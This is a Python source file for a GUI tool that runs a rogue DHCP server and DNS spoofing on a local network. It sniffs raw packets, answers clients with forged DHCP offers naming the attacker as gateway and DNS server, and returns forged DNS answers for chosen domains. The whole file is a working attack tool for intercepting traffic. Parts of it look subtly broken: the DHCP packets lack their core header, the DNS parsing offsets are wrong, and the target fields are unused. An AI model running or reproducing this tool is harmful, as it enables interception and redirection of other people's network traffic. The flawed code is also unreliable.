import threading
from tkinter import *
from tkinter import scrolledtext
from tkinter import ttk
import psutil
import socket
import struct

# Default configuration of the fake DHCP server
default_config = {
    "fake_dhcp_server_ip": "192.168.1.1",
    "fake_dhcp_server_mac": "02:42:ac:11:00:02",
    "subnet_mask": "255.255.255.0",
    "lease_time": 86400,
    "dns_server": "127.0.0.1",
    "default_gateway": "192.168.1.1",
    "assigned_ip": "192.168.1.100",
    "dns_spoofing": {
        "example.com": "5.6.7.8",
        "anotherexample.com": "9.10.11.12",
    },
}

# Global configuration
config = default_config.copy()
stop_sniffing_event = threading.Event()  # Event to control sniffing thread

# Function to list all working network interfaces with friendly names
def list_working_interfaces():
    interfaces = psutil.net_if_addrs()
    friendly_names = [name for name in interfaces.keys()]
    return friendly_names

# Function to calculate checksum
def checksum(data):
    if len(data) % 2 != 0:
        data += b'\0'
    s = sum(struct.unpack('!%sH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# Function to create UDP header
def create_udp_header(src_port, dst_port, length, data):
    pseudo_header = struct.pack('!4s4sBBH', 
                                socket.inet_aton(config["fake_dhcp_server_ip"]), 
                                socket.inet_aton("255.255.255.255"), 
                                0, socket.IPPROTO_UDP, length)
    udp_header = struct.pack('!HHHH', src_port, dst_port, length, 0)
    checksum_val = checksum(pseudo_header + udp_header + data)
    udp_header = struct.pack('!HHHH', src_port, dst_port, length, checksum_val)
    return udp_header

# Function to create IP header
def create_ip_header(src_ip, dst_ip, proto, total_length):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = total_length
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = proto
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    ip_check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    return ip_header

# Function to create and send DHCP OFFER packets
def send_dhcp_offer(pkt):
    log_text.insert(END, f"[+] DHCP Discover received\n")

    data = b'\x63\x82\x53\x63\x35\x01\x02\x36\x04' + socket.inet_aton(config["fake_dhcp_server_ip"]) + \
           b'\x33\x04' + struct.pack('!I', config["lease_time"]) + b'\x01\x04' + socket.inet_aton(config["subnet_mask"]) + \
           b'\x03\x04' + socket.inet_aton(config["default_gateway"]) + b'\x06\x04' + socket.inet_aton(config["dns_server"]) + \
           b'\xff'

    udp_header = create_udp_header(67, 68, 8 + len(data), data)
    ip_header = create_ip_header(config["fake_dhcp_server_ip"], "255.255.255.255", socket.IPPROTO_UDP, 20 + len(udp_header) + len(data))

    packet = ip_header + udp_header + data
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.sendto(packet, ("255.255.255.255", 0))

    log_text.insert(END, f"[+] DHCP Offer sent\n")

# Function to create and send DHCP ACK packets
def send_dhcp_ack(pkt):
    log_text.insert(END, f"[+] DHCP Request received\n")

    data = b'\x63\x82\x53\x63\x35\x01\x05\x36\x04' + socket.inet_aton(config["fake_dhcp_server_ip"]) + \
           b'\x33\x04' + struct.pack('!I', config["lease_time"]) + b'\x01\x04' + socket.inet_aton(config["subnet_mask"]) + \
           b'\x03\x04' + socket.inet_aton(config["default_gateway"]) + b'\x06\x04' + socket.inet_aton(config["dns_server"]) + \
           b'\xff'

    udp_header = create_udp_header(67, 68, 8 + len(data), data)
    ip_header = create_ip_header(config["fake_dhcp_server_ip"], "255.255.255.255", socket.IPPROTO_UDP, 20 + len(udp_header) + len(data))

    packet = ip_header + udp_header + data
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.sendto(packet, ("255.255.255.255", 0))

    log_text.insert(END, f"[+] DHCP Ack sent\n")

# Function to handle DHCP spoofing
def dhcp_spoof(pkt):
    eth_header = pkt[:14]
    eth_data = struct.unpack("!6s6sH", eth_header)
    if eth_data[2] == 0x0800:  # IP packet
        ip_header = pkt[14:34]
        ip_data = struct.unpack("!BBHHHBBH4s4s", ip_header)
        if ip_data[6] == 17:  # UDP packet
            udp_header = pkt[34:42]
            udp_data = struct.unpack("!HHHH", udp_header)
            if udp_data[0] == 68 and udp_data[1] == 67:  # DHCP packet
                dhcp_data = pkt[42:]
                dhcp_message_type = dhcp_data[240]
                if dhcp_message_type == 1:  # DHCP Discover
                    send_dhcp_offer(pkt)
                elif dhcp_message_type == 3:  # DHCP Request
                    send_dhcp_ack(pkt)

# Function to handle DNS spoofing
def dns_spoof(pkt):
    eth_header = pkt[:14]
    eth_data = struct.unpack("!6s6sH", eth_header)
    if eth_data[2] == 0x0800:  # IP packet
        ip_header = pkt[14:34]
        ip_data = struct.unpack("!BBHHHBBH4s4s", ip_header)
        if ip_data[6] == 17:  # UDP packet
            udp_header = pkt[34:42]
            udp_data = struct.unpack("!HHHH", udp_header)
            if udp_data[1] == 53:  # DNS packet
                dns_data = pkt[42:]
                query_name = b''
                end = 42
                while dns_data[end] != 0:
                    length = dns_data[end]
                    query_name += dns_data[end + 1:end + 1 + length] + b'.'
                    end += length + 1
                query_name = query_name[:-1].decode()
                if query_name in config['dns_spoofing']:
                    spoofed_ip = socket.inet_aton(config['dns_spoofing'][query_name])
                    transaction_id = dns_data[:2]
                    dns_response = transaction_id + b'\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00' + \
                                   dns_data[12:end + 5] + b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + spoofed_ip
                    udp_header = create_udp_header(53, udp_data[0], len(dns_response) + 8, dns_response)
                    ip_header = create_ip_header(socket.inet_ntoa(ip_data[9]), socket.inet_ntoa(ip_data[8]), socket.IPPROTO_UDP, 20 + len(udp_header) + len(dns_response))
                    packet = ip_header + udp_header + dns_response
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    s.sendto(packet, (socket.inet_ntoa(ip_data[8]), 0))
                    log_text.insert(END, f"[+] Spoofed DNS Response sent for {query_name} with IP {config['dns_spoofing'][query_name]}\n")

# Function to start sniffing DHCP and DNS packets from a specific IP or all IPs
def start_sniffing(interface, target_ip, target_mac):
    log_text.insert(END, f"[*] Starting DHCP and DNS spoofing on interface {interface}\n")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.bind((interface, 0))
    while not stop_sniffing_event.is_set():
        pkt, addr = s.recvfrom(65536)
        eth_header = pkt[:14]
        eth_data = struct.unpack("!6s6sH", eth_header)
        if eth_data[2] == 0x0800:  # IP packet
            ip_header = pkt[14:34]
            ip_data = struct.unpack("!BBHHHBBH4s4s", ip_header)
            if ip_data[6] == 17:  # UDP packet
                udp_header = pkt[34:42]
                udp_data = struct.unpack("!HHHH", udp_header)
                if udp_data[0] == 68 and udp_data[1] == 67:  # DHCP packet
                    dhcp_spoof(pkt)
                elif udp_data[1] == 53:  # DNS packet
                    dns_spoof(pkt)
        display_packet(pkt)

# Function to display packet details
def display_packet(pkt):
    log_text.insert(END, f"[Packet] {pkt}\n")

# Function to start the sniffing thread
def start_sniffing_thread():
    global interface, target_ip, target_mac
    interface = interface_var.get()
    target_ip = target_ip_var.get().strip()
    target_mac = target_mac_var.get().strip()
    stop_sniffing_event.clear()  # Clear the stop event
    threading.Thread(target=start_sniffing, args=(interface, target_ip, target_mac)).start()

# Function to stop the sniffing thread
def stop_sniffing_thread():
    stop_sniffing_event.set()  # Set the stop event
    log_text.insert(END, "[*] Stopping DHCP and DNS spoofing\n")

# Function to update the configuration with user inputs
def update_config():
    config["fake_dhcp_server_ip"] = dhcp_server_ip_var.get()
    config["fake_dhcp_server_mac"] = dhcp_server_mac_var.get()
    config["subnet_mask"] = subnet_mask_var.get()
    config["lease_time"] = int(lease_time_var.get())
    config["dns_server"] = dns_server_var.get()
    config["default_gateway"] = default_gateway_var.get()
    config["assigned_ip"] = assigned_ip_var.get()
    log_text.insert(END, "[*] Configuration updated\n")

# Main program starts here
root = Tk()
root.title("DHCP and DNS Spoofing")

tab_control = ttk.Notebook(root)

# Tab for interface selection and logging
tab1 = ttk.Frame(tab_control)
tab_control.add(tab1, text="Main")

interface_var = StringVar(tab1)
interfaces = list_working_interfaces()
interface_var.set(interfaces[0])

Label(tab1, text="Select Network Interface:").pack(pady=10)
OptionMenu(tab1, interface_var, *interfaces).pack(pady=10)

Label(tab1, text="Target IP (leave empty for all IPs):").pack(pady=10)
target_ip_var = StringVar(tab1)
Entry(tab1, textvariable=target_ip_var).pack(pady=10)

Label(tab1, text="Target MAC (leave empty for all MACs):").pack(pady=10)
target_mac_var = StringVar(tab1)
Entry(tab1, textvariable=target_mac_var).pack(pady=10)

Button(tab1, text="Start Spoofing", command=start_sniffing_thread).pack(pady=10)
Button(tab1, text="Stop Spoofing", command=stop_sniffing_thread).pack(pady=10)

log_text = scrolledtext.ScrolledText(tab1, width=100, height=20)
log_text.pack(pady=10)

# Tab for configuration settings
tab2 = ttk.Frame(tab_control)
tab_control.add(tab2, text="Configuration")

Label(tab2, text="DHCP Server IP:").grid(row=0, column=0, padx=10, pady=5, sticky=E)
dhcp_server_ip_var = StringVar(value=default_config["fake_dhcp_server_ip"])
Entry(tab2, textvariable=dhcp_server_ip_var).grid(row=0, column=1, padx=10, pady=5)

Label(tab2, text="DHCP Server MAC:").grid(row=1, column=0, padx=10, pady=5, sticky=E)
dhcp_server_mac_var = StringVar(value=default_config["fake_dhcp_server_mac"])
Entry(tab2, textvariable=dhcp_server_mac_var).grid(row=1, column=1, padx=10, pady=5)

Label(tab2, text="Subnet Mask:").grid(row=2, column=0, padx=10, pady=5, sticky=E)
subnet_mask_var = StringVar(value=default_config["subnet_mask"])
Entry(tab2, textvariable=subnet_mask_var).grid(row=2, column=1, padx=10, pady=5)

Label(tab2, text="Lease Time:").grid(row=3, column=0, padx=10, pady=5, sticky=E)
lease_time_var = StringVar(value=str(default_config["lease_time"]))
Entry(tab2, textvariable=lease_time_var).grid(row=3, column=1, padx=10, pady=5)

Label(tab2, text="DNS Server:").grid(row=4, column=0, padx=10, pady=5, sticky=E)
dns_server_var = StringVar(value=default_config["dns_server"])
Entry(tab2, textvariable=dns_server_var).grid(row=4, column=1, padx=10, pady=5)

Label(tab2, text="Default Gateway:").grid(row=5, column=0, padx=10, pady=5, sticky=E)
default_gateway_var = StringVar(value=default_config["default_gateway"])
Entry(tab2, textvariable=default_gateway_var).grid(row=5, column=1, padx=10, pady=5)

Label(tab2, text="Assigned IP:").grid(row=6, column=0, padx=10, pady=5, sticky=E)
assigned_ip_var = StringVar(value=default_config["assigned_ip"])
Entry(tab2, textvariable=assigned_ip_var).grid(row=6, column=1, padx=10, pady=5)

Button(tab2, text="Update Configuration", command=update_config).grid(row=7, columnspan=2, pady=10)

tab_control.pack(expand=1, fill="both")

root.mainloop()
